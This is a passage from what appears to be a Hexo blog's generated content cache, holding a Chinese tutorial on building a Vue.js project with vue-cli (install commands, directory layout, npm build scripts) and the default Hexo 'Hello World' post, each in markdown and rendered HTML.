# config file for eslint with extra settings only for unit tests\n│   │   ├── index.js            # test build entry file\n│   │   ├── jest.conf.js        # Config file when using Jest for unit tests\n│   │   └── karma.conf.js       # test runner config file when using Karma for unit tests\n│   │   ├── setup.js            # file that runs before Jest runs your unit tests\n│   └── e2e/                    # e2e tests\n│   │   ├── specs/              # test spec files\n│   │   ├── custom-assertions/  # custom assertions for e2e tests\n│   │   ├── runner.js           # test runner script\n│   │   └── nightwatch.conf.js  # test runner config file\n├── .babelrc                    # babel config\n├── .editorconfig               # indentation, spaces/tabs and similar settings for your editor\n├── .eslintrc.js                # eslint config\n├── .eslintignore               # eslint ignore rules\n├── .gitignore                  # sensible defaults for gitignore\n├── .postcssrc.js               # postcss config\n├── index.html                  # index.html template\n├── package.json                # build scripts and dependencies\n└── README.md                   # Default README file\n```\n> 目录/文件介绍：\n\n- `build/`：该目录保存的是开发和生产环境中的webpack配置，一般情况下是不需要进行修改的；当需要自定义webpack配置时，可以从webpack.base.conf.js开始研究。\n\n- `config/index.js`：这是项目构建时需要的一些最常用到的配置文件。\n\n- `src/`：这里存放的就是我们的业务代码了，我们可以根据项目需要自行配置。\n\n- `static/`：在这里，我们可以存放一些我们不希望webpack来处理的静态资源文件，在使用webpack来构建时，这里的文件将会直接复制到构建后的资源目录下。\n\n- `test/unit`：单元测试相关文件。\n\n- `test/e2e`：e2e测试相关文件。\n\n- `index.html`：基于vue.js的SPA单页应用的入口HTML模板，在开发、构建过程中，webpack将生成很多资源文件，文件之间的URL会被自动的注入到该index.html中。\n\n- `package.json`：npm包源文件，包含所有的构建依赖和构建命令。\n\n#### <a name=\"Commands\">2. 构建命令</a>\n\n<strong>所有的构建命令都是通过`npm`脚本执行的，见`package.json//scripts`。<strong>\n\n```\nnpm run dev\n```\n在本地开发环境启动一个node.js服务器。\n- `webpack` + `vue-loader` 作用于vue的单文件组件\n- 状态保存，热加载\n- 使用`ESLint`检查js\n- 生成资源文件的sourcemap\n- ......\n\n```\nnpm run build\n```\n在生产环境中构建资源\n- 使用`UglifyJS v3`压缩JavaScript\n- 使用`html-minifier`压缩HTML\n- 使用`cssnano`将所有组件的CSS提取到一个文件中\n- 使用版本哈希编译所有的静态文件，以实现资源的持久缓存。为所有的资源自定生成合适的URL，最后注入到`index.html`中，完成整个工程的构建。\n\n```\nnpm run unit\n```\n- 使用Jest在JSDOM中运行单元测试\n\n```\nnpm run lint\n```\n- 运行ESLint并报告任何linting错误。\n\n> 更多构建命令请查阅相关资料\n\n#### <a name=\"Babel\">3. 配置Babel</a>\n\n> 详见我的[另外一篇文章](/2018/03/01/0809007/)\n\n`至此，通过vue-cli构建vue工程的基本过程已经结束，查看更多详细配置，`[请转](https://vuejs-templates.github.io/webpack/)","source":"_posts/0809009_vue-cli快速构建vue-js项目.md","raw":"---\nid: 0809009\ntitle: vue-cli 快速构建 vue.js 项目\ndate: 2018-01-02 14:59:28\ntags:\n    - vue.js\n    - webpack\n    - JavaScript\n    - es6\ncategories:\n---\n- <a href=\"#Quickstart\">快速上手</a>\n- <a href=\"#Commands\">构建命令</a>\n- <a href=\"#Babel\">配置Babel</a>\n\n#### <a name=\"Quickstart\">1. 快速上手</a>\n本文介绍如何使用vue-cli快速构建vus.js项目，主要用到`webpack`，以及`vue-loader`，所以确保你的环境中安装有webpack。\n\n```bash\n# 安装vue-cli脚手架工具\n$ npm install -g vue-cli\n\n# 在 my-project 目录中生成一个项目\n# 这一步中你还可以选择是否安装vue-router,ESLint,unit tests, e2e tests...\n$ vue init webpack my-project\n\n# 进入到项目\n$ cd my-project\n\n# 安装依赖\n$ npm install\n\n# 构建并启动项目\n$ npm run dev\n```\n如果你在 `vue init webpack my-project` 步骤中选择安装所有的工具，那么我们的项目目录结构应该是这样的：\n```\n.\n├── build/                      # webpack config files\n│   └── ...\n├── config/\n│   ├── index.js                # main project config\n│   └── ...\n├── src/\n│   ├── main.js                 # app entry file\n│   ├── App.vue                 # main app component\n│   ├── components/             # ui components\n│   │   └── ...\n│   └── assets/                 # module assets (processed by webpack)\n│       └── ...\n├── static/                     # pure static assets (directly copied)\n├── test/\n│   └── unit/                   # unit tests\n│   │   ├── specs/              # test spec files\n│   │   ├── eslintrc            # config file for eslint with extra settings only for unit tests\n│   │   ├── index.js            # test build entry file\n│   │   ├── jest.conf.js        # Config file when using Jest for unit tests\n│   │   └── karma.conf.js       # test runner config file when using Karma for unit tests\n│   │   ├── setup.js            # file that runs before Jest runs your unit tests\n│   └── e2e/                    # e2e tests\n│   │   ├── specs/              # test spec files\n│   │   ├── custom-assertions/  # custom assertions for e2e tests\n│   │   ├── runner.js           # test runner script\n│   │   └── nightwatch.conf.js  # test runner config file\n├── .babelrc                    # babel config\n├── .editorconfig               # indentation, spaces/tabs and similar settings for your editor\n├── .eslintrc.js                # eslint config\n├── .eslintignore               # eslint ignore rules\n├── .gitignore                  # sensible defaults for gitignore\n├── .postcssrc.js               # postcss config\n├── index.html                  # index.html template\n├── package.json                # build scripts and dependencies\n└── README.md                   # Default README file\n```\n> 目录/文件介绍：\n\n- `build/`：该目录保存的是开发和生产环境中的webpack配置，一般情况下是不需要进行修改的；当需要自定义webpack配置时，可以从webpack.base.conf.js开始研究。\n\n- `config/index.js`：这是项目构建时需要的一些最常用到的配置文件。\n\n- `src/`：这里存放的就是我们的业务代码了，我们可以根据项目需要自行配置。\n\n- `static/`：在这里，我们可以存放一些我们不希望webpack来处理的静态资源文件，在使用webpack来构建时，这里的文件将会直接复制到构建后的资源目录下。\n\n- `test/unit`：单元测试相关文件。\n\n- `test/e2e`：e2e测试相关文件。\n\n- `index.html`：基于vue.js的SPA单页应用的入口HTML模板，在开发、构建过程中，webpack将生成很多资源文件，文件之间的URL会被自动的注入到该index.html中。\n\n- `package.json`：npm包源文件，包含所有的构建依赖和构建命令。\n\n#### <a name=\"Commands\">2. 构建命令</a>\n\n<strong>所有的构建命令都是通过`npm`脚本执行的，见`package.json//scripts`。<strong>\n\n```\nnpm run dev\n```\n在本地开发环境启动一个node.js服务器。\n- `webpack` + `vue-loader` 作用于vue的单文件组件\n- 状态保存，热加载\n- 使用`ESLint`检查js\n- 生成资源文件的sourcemap\n- ......\n\n```\nnpm run build\n```\n在生产环境中构建资源\n- 使用`UglifyJS v3`压缩JavaScript\n- 使用`html-minifier`压缩HTML\n- 使用`cssnano`将所有组件的CSS提取到一个文件中\n- 使用版本哈希编译所有的静态文件，以实现资源的持久缓存。为所有的资源自定生成合适的URL，最后注入到`index.html`中，完成整个工程的构建。\n\n```\nnpm run unit\n```\n- 使用Jest在JSDOM中运行单元测试\n\n```\nnpm run lint\n```\n- 运行ESLint并报告任何linting错误。\n\n> 更多构建命令请查阅相关资料\n\n#### <a name=\"Babel\">3. 配置Babel</a>\n\n> 详见我的[另外一篇文章](/2018/03/01/0809007/)\n\n`至此，通过vue-cli构建vue工程的基本过程已经结束，查看更多详细配置，`[请转](https://vuejs-templates.github.io/webpack/)","slug":"0809009_vue-cli快速构建vue-js项目","published":1,"updated":"2018-03-26T12:16:32.917Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvtk000bs4c00gzja4gr","content":"<ul>\n<li><a href=\"#Quickstart\">快速上手</a></li>\n<li><a href=\"#Commands\">构建命令</a></li>\n<li><a href=\"#Babel\">配置Babel</a></li>\n</ul>\n<h4 id=\"1-快速上手\"><a href=\"#1-快速上手\" class=\"headerlink\" title=\"1. 快速上手\"></a><a name=\"Quickstart\">1. 快速上手</a></h4><p>本文介绍如何使用vue-cli快速构建vus.js项目，主要用到<code>webpack</code>，以及<code>vue-loader</code>，所以确保你的环境中安装有webpack。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装vue-cli脚手架工具</span></span><br><span class=\"line\">$ npm install -g vue-cli</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 my-project 目录中生成一个项目</span></span><br><span class=\"line\"><span class=\"comment\"># 这一步中你还可以选择是否安装vue-router,ESLint,unit tests, e2e tests...</span></span><br><span class=\"line\">$ vue init webpack my-project</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 进入到项目</span></span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> my-project</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装依赖</span></span><br><span class=\"line\">$ npm install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 构建并启动项目</span></span><br><span class=\"line\">$ npm run dev</span><br></pre></td></tr></table></figure>\n<p>如果你在 <code>vue init webpack my-project</code> 步骤中选择安装所有的工具，那么我们的项目目录结构应该是这样的：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.</span><br><span class=\"line\">├── build/                      # webpack config files</span><br><span class=\"line\">│   └── ...</span><br><span class=\"line\">├── config/</span><br><span class=\"line\">│   ├── index.js                # main project config</span><br><span class=\"line\">│   └── ...</span><br><span class=\"line\">├── src/</span><br><span class=\"line\">│   ├── main.js                 # app entry file</span><br><span class=\"line\">│   ├── App.vue                 # main app component</span><br><span class=\"line\">│   ├── components/             # ui components</span><br><span class=\"line\">│   │   └── ...</span><br><span class=\"line\">│   └── assets/                 # module assets (processed by webpack)</span><br><span class=\"line\">│       └── ...</span><br><span class=\"line\">├── static/                     # pure static assets (directly copied)</span><br><span class=\"line\">├── test/</span><br><span class=\"line\">│   └── unit/                   # unit tests</span><br><span class=\"line\">│   │   ├── specs/              # test spec files</span><br><span class=\"line\">│   │   ├── eslintrc            # config file for eslint with extra settings only for unit tests</span><br><span class=\"line\">│   │   ├── index.js            # test build entry file</span><br><span class=\"line\">│   │   ├── jest.conf.js        # Config file when using Jest for unit tests</span><br><span class=\"line\">│   │   └── karma.conf.js       # test runner config file when using Karma for unit tests</span><br><span class=\"line\">│   │   ├── setup.js            # file that runs before Jest runs your unit tests</span><br><span class=\"line\">│   └── e2e/                    # e2e tests</span><br><span class=\"line\">│   │   ├── specs/              # test spec files</span><br><span class=\"line\">│   │   ├── custom-assertions/  # custom assertions for e2e tests</span><br><span class=\"line\">│   │   ├── runner.js           # test runner script</span><br><span class=\"line\">│   │   └── nightwatch.conf.js  # test runner config file</span><br><span class=\"line\">├── .babelrc                    # babel config</span><br><span class=\"line\">├── .editorconfig               # indentation, spaces/tabs and similar settings for your editor</span><br><span class=\"line\">├── .eslintrc.js                # eslint config</span><br><span class=\"line\">├── .eslintignore               # eslint ignore rules</span><br><span class=\"line\">├── .gitignore                  # sensible defaults for gitignore</span><br><span class=\"line\">├── .postcssrc.js               # postcss config</span><br><span class=\"line\">├── index.html                  # index.html template</span><br><span class=\"line\">├── package.json                # build scripts and dependencies</span><br><span class=\"line\">└── README.md                   # Default README file</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>目录/文件介绍：</p>\n</blockquote>\n<ul>\n<li><p><code>build/</code>：该目录保存的是开发和生产环境中的webpack配置，一般情况下是不需要进行修改的；当需要自定义webpack配置时，可以从webpack.base.conf.js开始研究。</p>\n</li>\n<li><p><code>config/index.js</code>：这是项目构建时需要的一些最常用到的配置文件。</p>\n</li>\n<li><p><code>src/</code>：这里存放的就是我们的业务代码了，我们可以根据项目需要自行配置。</p>\n</li>\n<li><p><code>static/</code>：在这里，我们可以存放一些我们不希望webpack来处理的静态资源文件，在使用webpack来构建时，这里的文件将会直接复制到构建后的资源目录下。</p>\n</li>\n<li><p><code>test/unit</code>：单元测试相关文件。</p>\n</li>\n<li><p><code>test/e2e</code>：e2e测试相关文件。</p>\n</li>\n<li><p><code>index.html</code>：基于vue.js的SPA单页应用的入口HTML模板，在开发、构建过程中，webpack将生成很多资源文件，文件之间的URL会被自动的注入到该index.html中。</p>\n</li>\n<li><p><code>package.json</code>：npm包源文件，包含所有的构建依赖和构建命令。</p>\n</li>\n</ul>\n<h4 id=\"2-构建命令\"><a href=\"#2-构建命令\" class=\"headerlink\" title=\"2. 构建命令\"></a><a name=\"Commands\">2. 构建命令</a></h4><p><strong>所有的构建命令都是通过<code>npm</code>脚本执行的，见<code>package.json//scripts</code>。<strong></strong></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm run dev</span><br></pre></td></tr></table></figure>\n<p>在本地开发环境启动一个node.js服务器。</p>\n<ul>\n<li><code>webpack</code> + <code>vue-loader</code> 作用于vue的单文件组件</li>\n<li>状态保存，热加载</li>\n<li>使用<code>ESLint</code>检查js</li>\n<li>生成资源文件的sourcemap</li>\n<li>……</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm run build</span><br></pre></td></tr></table></figure>\n<p>在生产环境中构建资源</p>\n<ul>\n<li>使用<code>UglifyJS v3</code>压缩JavaScript</li>\n<li>使用<code>html-minifier</code>压缩HTML</li>\n<li>使用<code>cssnano</code>将所有组件的CSS提取到一个文件中</li>\n<li>使用版本哈希编译所有的静态文件，以实现资源的持久缓存。为所有的资源自定生成合适的URL，最后注入到<code>index.html</code>中，完成整个工程的构建。</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm run unit</span><br></pre></td></tr></table></figure>\n<ul>\n<li>使用Jest在JSDOM中运行单元测试</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm run lint</span><br></pre></td></tr></table></figure>\n<ul>\n<li>运行ESLint并报告任何linting错误。</li>\n</ul>\n<blockquote>\n<p>更多构建命令请查阅相关资料</p>\n</blockquote>\n<h4 id=\"3-配置Babel\"><a href=\"#3-配置Babel\" class=\"headerlink\" title=\"3. 配置Babel\"></a><a name=\"Babel\">3. 配置Babel</a></h4><blockquote>\n<p>详见我的<a href=\"/2018/03/01/0809007/\">另外一篇文章</a></p>\n</blockquote>\n<p><code>至此，通过vue-cli构建vue工程的基本过程已经结束，查看更多详细配置，</code><a href=\"https://vuejs-templates.github.io/webpack/\" target=\"_blank\" rel=\"noopener\">请转</a></p>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><a href=\"#Quickstart\">快速上手</a></li>\n<li><a href=\"#Commands\">构建命令</a></li>\n<li><a href=\"#Babel\">配置Babel</a></li>\n</ul>\n<h4 id=\"1-快速上手\"><a href=\"#1-快速上手\" class=\"headerlink\" title=\"1. 快速上手\"></a><a name=\"Quickstart\">1. 快速上手</a></h4><p>本文介绍如何使用vue-cli快速构建vus.js项目，主要用到<code>webpack</code>，以及<code>vue-loader</code>，所以确保你的环境中安装有webpack。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装vue-cli脚手架工具</span></span><br><span class=\"line\">$ npm install -g vue-cli</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 my-project 目录中生成一个项目</span></span><br><span class=\"line\"><span class=\"comment\"># 这一步中你还可以选择是否安装vue-router,ESLint,unit tests, e2e tests...</span></span><br><span class=\"line\">$ vue init webpack my-project</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 进入到项目</span></span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> my-project</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装依赖</span></span><br><span class=\"line\">$ npm install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 构建并启动项目</span></span><br><span class=\"line\">$ npm run dev</span><br></pre></td></tr></table></figure>\n<p>如果你在 <code>vue init webpack my-project</code> 步骤中选择安装所有的工具，那么我们的项目目录结构应该是这样的：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.</span><br><span class=\"line\">├── build/                      # webpack config files</span><br><span class=\"line\">│   └── ...</span><br><span class=\"line\">├── config/</span><br><span class=\"line\">│   ├── index.js                # main project config</span><br><span class=\"line\">│   └── ...</span><br><span class=\"line\">├── src/</span><br><span class=\"line\">│   ├── main.js                 # app entry file</span><br><span class=\"line\">│   ├── App.vue                 # main app component</span><br><span class=\"line\">│   ├── components/             # ui components</span><br><span class=\"line\">│   │   └── ...</span><br><span class=\"line\">│   └── assets/                 # module assets (processed by webpack)</span><br><span class=\"line\">│       └── ...</span><br><span class=\"line\">├── static/                     # pure static assets (directly copied)</span><br><span class=\"line\">├── test/</span><br><span class=\"line\">│   └── unit/                   # unit tests</span><br><span class=\"line\">│   │   ├── specs/              # test spec files</span><br><span class=\"line\">│   │   ├── eslintrc            # config file for eslint with extra settings only for unit tests</span><br><span class=\"line\">│   │   ├── index.js            # test build entry file</span><br><span class=\"line\">│   │   ├── jest.conf.js        # Config file when using Jest for unit tests</span><br><span class=\"line\">│   │   └── karma.conf.js       # test runner config file when using Karma for unit tests</span><br><span class=\"line\">│   │   ├── setup.js            # file that runs before Jest runs your unit tests</span><br><span class=\"line\">│   └── e2e/                    # e2e tests</span><br><span class=\"line\">│   │   ├── specs/              # test spec files</span><br><span class=\"line\">│   │   ├── custom-assertions/  # custom assertions for e2e tests</span><br><span class=\"line\">│   │   ├── runner.js           # test runner script</span><br><span class=\"line\">│   │   └── nightwatch.conf.js  # test runner config file</span><br><span class=\"line\">├── .babelrc                    # babel config</span><br><span class=\"line\">├── .editorconfig               # indentation, spaces/tabs and similar settings for your editor</span><br><span class=\"line\">├── .eslintrc.js                # eslint config</span><br><span class=\"line\">├── .eslintignore               # eslint ignore rules</span><br><span class=\"line\">├── .gitignore                  # sensible defaults for gitignore</span><br><span class=\"line\">├── .postcssrc.js               # postcss config</span><br><span class=\"line\">├── index.html                  # index.html template</span><br><span class=\"line\">├── package.json                # build scripts and dependencies</span><br><span class=\"line\">└── README.md                   # Default README file</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>目录/文件介绍：</p>\n</blockquote>\n<ul>\n<li><p><code>build/</code>：该目录保存的是开发和生产环境中的webpack配置，一般情况下是不需要进行修改的；当需要自定义webpack配置时，可以从webpack.base.conf.js开始研究。</p>\n</li>\n<li><p><code>config/index.js</code>：这是项目构建时需要的一些最常用到的配置文件。</p>\n</li>\n<li><p><code>src/</code>：这里存放的就是我们的业务代码了，我们可以根据项目需要自行配置。</p>\n</li>\n<li><p><code>static/</code>：在这里，我们可以存放一些我们不希望webpack来处理的静态资源文件，在使用webpack来构建时，这里的文件将会直接复制到构建后的资源目录下。</p>\n</li>\n<li><p><code>test/unit</code>：单元测试相关文件。</p>\n</li>\n<li><p><code>test/e2e</code>：e2e测试相关文件。</p>\n</li>\n<li><p><code>index.html</code>：基于vue.js的SPA单页应用的入口HTML模板，在开发、构建过程中，webpack将生成很多资源文件，文件之间的URL会被自动的注入到该index.html中。</p>\n</li>\n<li><p><code>package.json</code>：npm包源文件，包含所有的构建依赖和构建命令。</p>\n</li>\n</ul>\n<h4 id=\"2-构建命令\"><a href=\"#2-构建命令\" class=\"headerlink\" title=\"2. 构建命令\"></a><a name=\"Commands\">2. 构建命令</a></h4><p><strong>所有的构建命令都是通过<code>npm</code>脚本执行的，见<code>package.json//scripts</code>。<strong></strong></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm run dev</span><br></pre></td></tr></table></figure>\n<p>在本地开发环境启动一个node.js服务器。</p>\n<ul>\n<li><code>webpack</code> + <code>vue-loader</code> 作用于vue的单文件组件</li>\n<li>状态保存，热加载</li>\n<li>使用<code>ESLint</code>检查js</li>\n<li>生成资源文件的sourcemap</li>\n<li>……</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm run build</span><br></pre></td></tr></table></figure>\n<p>在生产环境中构建资源</p>\n<ul>\n<li>使用<code>UglifyJS v3</code>压缩JavaScript</li>\n<li>使用<code>html-minifier</code>压缩HTML</li>\n<li>使用<code>cssnano</code>将所有组件的CSS提取到一个文件中</li>\n<li>使用版本哈希编译所有的静态文件，以实现资源的持久缓存。为所有的资源自定生成合适的URL，最后注入到<code>index.html</code>中，完成整个工程的构建。</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm run unit</span><br></pre></td></tr></table></figure>\n<ul>\n<li>使用Jest在JSDOM中运行单元测试</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm run lint</span><br></pre></td></tr></table></figure>\n<ul>\n<li>运行ESLint并报告任何linting错误。</li>\n</ul>\n<blockquote>\n<p>更多构建命令请查阅相关资料</p>\n</blockquote>\n<h4 id=\"3-配置Babel\"><a href=\"#3-配置Babel\" class=\"headerlink\" title=\"3. 配置Babel\"></a><a name=\"Babel\">3. 配置Babel</a></h4><blockquote>\n<p>详见我的<a href=\"/2018/03/01/0809007/\">另外一篇文章</a></p>\n</blockquote>\n<p><code>至此，通过vue-cli构建vue工程的基本过程已经结束，查看更多详细配置，</code><a href=\"https://vuejs-templates.github.io/webpack/\" target=\"_blank\" rel=\"noopener\">请转</a></p>\n"},{"id":"0809000","title":"Hello World","date":"2016-09-09T12:49:31.000Z","_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/deployment.html)\n","source":"_posts/0809000_hello-world.md","raw":"---\nid: 0809000\ntitle: Hello World\ndate: 2016-09-09 20:49:31\ntags: \n    - HTML\ncategories: \n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/deployment.html)\n","slug":"0809000_hello-world","published":1,"updated":"2018-03-16T10:37:05.995Z","_id":"cjfhshvtm000cs4c0eqlbav6g","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Welcome to <a href=\"https://hexo.io/\" target=\"_blank\" rel=\"noopener\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\" target=\"_blank\" rel=\"noopener\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\" target=\"_blank\" rel=\"noopener\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\" target=\"_blank\" rel=\"noopener\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\" target=\"_blank\" rel=\"noopener\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\" target=\"_blank\" rel=\"noopener\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\" target=\"_blank\" rel=\"noopener\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/deployment.html\" target=\"_blank\" rel=\"noopener\">Deployment</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\" target=\"_blank\" rel=\"noopener\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\" target=\"_blank\" rel=\"noopener\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\" target=\"_blank\" rel=\"noopener\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\" target=\"_blank\" rel=\"noopener\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td 